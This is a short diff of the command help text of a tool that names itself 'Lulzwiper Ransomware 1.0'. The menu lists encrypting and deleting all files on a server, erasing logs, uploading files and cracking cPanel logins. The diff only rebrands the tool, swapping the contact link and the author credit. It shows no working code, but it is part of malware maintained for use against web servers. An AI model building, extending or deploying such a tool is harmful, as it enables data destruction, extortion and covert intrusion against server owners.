@@ -80,8 +80,8 @@ command :
 Encrypt files = cry
 Decrypt files = decry                                                                            
 upload files = upload                                                                            Lulzwiper Ransomware 1.0
-remove log = logfucker                                                                           contact us = https://www.facebook.com/LulzSecIndiaOfficial/
-Delete all files = fuckserver                                                                    coded by = script1337  
+remove log = logfucker                                                                           contact us = https://www.facebook.com/
+Delete all files = fuckserver                                                                    coded by = trhacknon 
 check if cpanel can be creck = ccheck
 creck cpanel =  creckzee   
 replace = replace files content
